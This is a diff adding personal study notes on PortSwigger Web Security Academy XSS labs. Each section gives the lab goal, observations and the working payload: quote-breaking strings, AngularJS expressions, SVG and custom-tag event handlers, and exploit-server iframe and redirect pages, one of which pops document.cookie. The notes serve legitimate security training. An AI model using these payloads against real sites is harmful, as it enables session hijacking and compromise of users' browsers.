@@ -109,3 +109,261 @@ Because the code directly concatenates the decoded hash into a jQuery selector w
 ```<iframe src="https://victim/#" onload=print()></iframe>```
 
 The onload handler here runs in the parent document’s execution context (the page that contains the <iframe>), not inside the framed origin. So print() targets the parent page, not the victim page. Modern browsers also often suppress window.print() when it’s called on load without a user gesture—especially from an <iframe>—so nothing visible happens for the victim.
+
+# Stored XSS into anchor href attribute with double quotes HTML - encoded
+Get an alert to pop. 
+##Observations 
+- The username for some odd reason, created an href link within your name when you post a comment. 
+- Goal - find a payload that will work in the URL to pop an alert when a victim clicks on my username.
+- The website value that was being passed to the comment was being used as a hyperlink reference with the user's name as the display-as. So, with no real URL validation the payload ```javascript:alert(1)``` achieves the goal. 
+
+# Reflected XSS into a JavaScript string with angle brackets HTML encoded
+Get an alert box. 
+## Observations
+```
+<script>
+    var searchTerms = 'test';
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+The search term is reflected in an image tracker in the URL. However double quotes and angle bracket is encoded to prevent XSS. 
+However, we can see that we can escape that by closing the single quotes around test prematurely and then exeuting alert because we're already inside of a javascript block. 
+```
+'; alert();//'
+```
+This makes the script block look like this:
+```
+<script>
+    var searchTerms = ''; alert();//'';
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+
+# DOM XSS in document.write sink using source location.search inside a select element
+Get an alert box. 
+## Observations
+- Interestiong script block:
+```
+<script>
+    var stores = ["London","Paris","Milan"];
+    var store = (new URLSearchParams(window.location.search)).get('storeId');
+    document.write('<select name="storeId">');
+    if(store) {
+        document.write('<option selected>'+store+'</option>');
+        }
+    for(var i=0;i<stores.length;i++) {
+        if(stores[i] === store) {
+            continue;
+        }
+        document.write('<option>'+stores[i]+'</option>');
+    }
+    document.write('</select>');
+</script>
+```
+- The script is looking for the storeId param in the URL which we can provide the DOM Invader canary to along with a product ID to find the sink. 
+https://0a8d0017048671f081543917006f0029.web-security-academy.net/product?storeId=oeyiugzj&productId=1
+
+- Interestingly, this works and seems correct but didn't solve the challenge:
+```
+https://0a8d0017048671f081543917006f0029.web-security-academy.net/product?storeId=%3Cimg%20src=x%20onerror=alert()%3E%3C/img%3E&productId=1
+```
+Stupidly, it want's this payload specifically:
+```
+productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
+```
+
+# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+Get an alert box from HTML nodes containing the ng-app attribute from Angular JS.
+## Observations
+- No odd JS in the body of the pages. 
+- It does pull in angular_1-7-7.js which other pages haven't done. So, I am going to research that. 
+
+# Reflected XSS into HTML context with most tags and attributes blocked
+Get a print() action without user interaction. 
+
+## Observations
+- Search box reflects user input but there isn't any funky JS in the response body. 
+- Tried typical script payload and it says, "tag is not allowed". Probably best to send'er to Intruder and throw a payload list at it. 
+-- Tried Intruder with a payload list, nothing seemed to pop. 
+-- Trying with Dalfox in URL mode - no luck. 
+- Crafted a payload list with Cursor that included body tags. Providing ```<body =1>``` works. 
+- Need to weaponize it and onload won't work. Found that onresize works so we'll need to ensure that we specify a size with the iframe to deliver the payload. 
+- Setting up exploit server - we need to do the iframe payload thing and make sure the execution context of the iframe and script is the victim's page, not the iframe hosting page. 
+```
+<iframe src="[URL]/?search="><body onresize=print()>" onload=this.style.width='100px'>
+```
+Crafted up some lists for working through blacklisted tags and subsequent payload execution discovery. 
+
+# Reflected XSS into HTML context with all tags blocked except custom ones
+Get document.cookie to pop. 
+## Observations
+- As seen with the previous list, no html tags are allowed BUT custom tags work. 
+- With this ability to inject custom tags, we need to craft a payload that will trigger JS. 
+-- Crafting a custom tag with an focusable element like tabindex=1 tells the browser "this element can receive focus" and we can target that element with a URL fragment (#x) We then use a trailing fragment to trigger the attack:
+```
+<evil id=go tabindex=1 onfocus=alert(1)>#go
+```
+- Final payload:
+```
+<script>
+location = 'https://0af0006004c110408073036000b9000d.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+```
+-- NOTE: the reason we need to use <script> rather than an <iframe> here is that focus doesn't propogate into cross-origin iframes onload. 
+
+# Reflected XSS with some SVG markup allowed
+Pop an alert box. 
+## Observations
+- Search box and comments available as vectors - search box content is not in URL and no interesting JS in search. The comments don't look overly interesting BUT I do see that someone posted in French and their apostrophes are encoded so we're up against that. 
+- Back to search for initial hunting.
+-- Trying payloads, we find that ```<svg id=x onfocus=alert(1)>``` tags are allowed but event isn't. 
+-- Needed to find the right event which took some digging on PS's list. 
+```
+"><svg><animatetransform onbegin=alert(1)>
+```
+# Reflected XSS in canonical link tag
+Get an alert box. 
+Odd instructions:
+To assist with your exploit, you can assume that the simulated user will press the following key combinations:
+
+ALT+SHIFT+X
+CTRL+ALT+X
+Alt+X
+## Observations
+- No search this time. Just comments. 
+- Comments don't seem vulnerable. 
+- Trying Dalfox - flagged that pretty much any parameter that's appended gets processed into the page, turns out there is canoncial link tag. 
+- Payload will require user interaction:
+```
+'accesskey='x'onclick='alert(1)
+```
+
+# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+Get an alert box
+## Observations
+- DOM Intruder popped in the search query. element.setAttribute.href
+- AngularJS is passing the payload to a sink that encods angle brackets and double quotes so we need to use something specific:
+```
+{{$on.constructor('alert(1)')()}}
+```
+
+# Reflected DOM XSS
+get an alert box
+## Observations
+- DOM Invader shows the canary is passed to an eval sink within the search function. However, typical payloads aren't working. 
+- Review of resources/js/searchResults.js
+```
+function search(path) {
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+            eval('var searchResultsObj = ' + this.responseText);
+            displaySearchResults(searchResultsObj);
+        }
+    };
+    xhr.open("GET", path + window.location.search);
+    xhr.send();
+
+    function displaySearchResults(searchResultsObj) {
+        var blogHeader = document.getElementsByClassName("blog-header")[0];
+        var blogList = document.getElementsByClassName("blog-list")[0];
+        var searchTerm = searchResultsObj.searchTerm
+        var searchResults = searchResultsObj.results
+
+        var h1 = document.createElement("h1");
+        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
+        blogHeader.appendChild(h1);
+        var hr = document.createElement("hr");
+        blogHeader.appendChild(hr)
+
+        for (var i = 0; i < searchResults.length; ++i)
+        {
+            var searchResult = searchResults[i];
+            if (searchResult.id) {
+                var blogLink = document.createElement("a");
+                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);
+
+                if (searchResult.headerImage) {
+                    var headerImage = document.createElement("img");
+                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
+                    blogLink.appendChild(headerImage);
+                }
+
+                blogList.appendChild(blogLink);
+            }
+
+            blogList.innerHTML += "<br/>";
+
+            if (searchResult.title) {
+                var title = document.createElement("h2");
+                title.innerText = searchResult.title;
+                blogList.appendChild(title);
+            }
+
+            if (searchResult.summary) {
+                var summary = document.createElement("p");
+                summary.innerText = searchResult.summary;
+                blogList.appendChild(summary);
+            }
+
+            if (searchResult.id) {
+                var viewPostButton = document.createElement("a");
+                viewPostButton.setAttribute("class", "button is-small");
+                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
+                viewPostButton.innerText = "View post";
+            }
+        }
+
+        var linkback = document.createElement("div");
+        linkback.setAttribute("class", "is-linkback");
+        var backToBlog = document.createElement("a");
+        backToBlog.setAttribute("href", "/");
+        backToBlog.innerText = "Back to Blog";
+        linkback.appendChild(backToBlog);
+        blogList.appendChild(linkback);
+    }
+}
+```
+- The risky link is ```eval('var searchResultsObj = ' + this.responseText);```
+- We need to break out of the context to get exection, something like ```x");alert(1);//```
+- That payload didn't quite escape the context the way I needed it to. Ultimately, ```\"-alert(1)}//``` was the right payload. 
+-- The reason for this is that this payload actually changes the parser state so that the code lands outside the string and the rest of the JSON gets safely ignored. 
+```
+// sink
+eval('var searchResultsObj = ' + RESPONSE);
+// typical RESPONSE shape built server-side:
+{"searchTerm":"<YOUR_INPUT>","results":[...]}
+```
+The forward slash effectively soaks of up the quote from the previous code block. Giving us this:
+```
+var searchResultsObj = {"searchTerm":"\"-alert(1)}//", "results":[...]}
+                     //            ^ escapes this quote ↑  ↑ closes }   ↑ comments out the rest
+                     // the alert runs here -------------^
+```
+
+# Reflected XSS into a JavaScript string with single quote and backslash escaped
+Get an alert box
+## Observations
+- Script block:
+```
+<script>
+    var searchTerms = 'test';
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+- We can see that the payload 'test' is encased in single quotes. BUT we can see that we could close the script block early by starting a payload with ```</script>```
+- Final payload ```</script><script>alert(1)</script>```
+
+# Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+Get an alert box. 
+## Observations
+```
+<script>
+    var searchTerms = 'test';
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+- With the filtering and encoding we're running into we can effectively soak up the JS and escape it. 
+``` \'-alert(1)//```
+
+#
